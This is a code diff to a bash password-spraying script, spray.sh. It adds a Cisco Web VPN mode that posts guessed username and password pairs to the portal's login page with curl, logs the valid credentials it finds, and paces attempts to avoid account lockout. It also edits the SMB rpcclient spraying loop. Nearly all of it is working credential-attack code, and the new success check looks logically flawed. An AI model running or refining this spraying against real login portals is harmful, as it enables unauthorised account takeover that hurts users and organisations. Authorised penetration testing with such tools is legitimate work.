@@ -17,6 +17,10 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
     echo "Example: spray.sh -lync https://lyncdiscover.company.com/ emails.txt passwords.txt 1 35\n"
     echo -e "Example: spray.sh -lync https://lyncweb.company.com/Autodiscover/AutodiscoverService.svc/root/oauth/user emails.txt passwords.txt 1 35\n"
 
+    echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
+    echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
+    echo -e "Example: spray.sh -ciso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
+
     echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
     echo "Useage: spray.sh -passupdate <passwordList>"
     echo "Example: spray.sh -passupdate passwords.txt"
@@ -56,8 +60,10 @@ if [ "$1" == "-passupdate" ] || [ "$1" == "--passupdate" ] || [ "$1" == "passupd
     else
     	shortdate2=$(($shortdate1-1))
     fi
-    sed -i.bak s/2017/$longdate1/g $2
-    sed -i.bak s/2016/$longdate2/g $2
+    
+    #sed -i.bak s/2017/$longdate1/g $2
+
+    #sed -i.bak s/2016/$longdate2/g $2
     sed -i.bak s/17/$shortdate1/g $2
     sed -i.bak s/16/$shortdate2/g $2
     echo "Complete"
@@ -117,7 +123,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     time=$(date +%H:%M:%S)
     echo "$time Spraying with password: Users Username"
     for u in $(cat $userslist); do 
-    	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername:quit" $target) >> logs/spray-logs.txt
+    	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
     done
     cat logs/spray-logs.txt | grep -v "Cannot"
     counter=$(($counter + 1))
@@ -131,7 +137,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
         time=$(date +%H:%M:%S)
     	echo "$time Spraying with password: $password"
     	for u in $(cat $userslist); do 
-    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername:quit" $target) >> logs/spray-logs.txt
+    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
     	done
         cat logs/spray-logs.txt | grep -v "Cannot"
         cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
@@ -272,6 +278,56 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
         done   
+        cat logs/spray-logs.txt | grep "Valid Credentials"
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
+
+        for completeuser in $(cat logs/usernamestoremove.txt); do 
+            sed -i.bak "/$completeuser/d" $userslist
+        done
+        rm logs/usernamestoremove.txt
+        counter=$(($counter + 1))
+        if [ $counter -eq $lockout ] ; then
+            counter=0
+            sleep $lockoutduration
+        fi
+    done
+fi
+
+#CISCO Web VPN Password Spraying
+if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
+    mkdir -p logs
+    set +H
+    cp $3 logs/username-removed-successes.txt
+    userslist="logs/username-removed-successes.txt"
+    passwordlist=$4
+    lockout=$5
+    lockoutduration=$(($6 * 60))
+    postrequest=$7
+    counter=0
+    touch logs/spray-logs.txt
+
+    target=$(echo $2 | cut -d '/' -f -3)
+    targetpath="$target/+webvpn+/index.html"
+    targetlogout="$target/+webvpn+/webvpn_logout.html"
+    
+    #Then start on list
+    for password in $(cat $passwordlist); do
+        time=$(date +%H:%M:%S)
+        echo "$time Spraying with password: $password"
+        for u in $(cat $userslist); do 
+            cookies="webvpn=; webvpnc=; webvpn_portal=; webvpnSharePoint=; webvpnlogin=1; webvpnLang=en;"
+            ciscologin=$(curl -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
+            
+            if echo $ciscologin | grep -q "SSL VPN Service" | grep "webvpn_logout" ; then
+                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
+                curl -s -b cookies.txt $targetlogout
+            else
+                echo "Incorrect $u%$password" >> logs/spray-logs.txt
+            fi
+            rm -f cookies.txt
+        done
+
         cat logs/spray-logs.txt | grep "Valid Credentials"
         cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
         cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
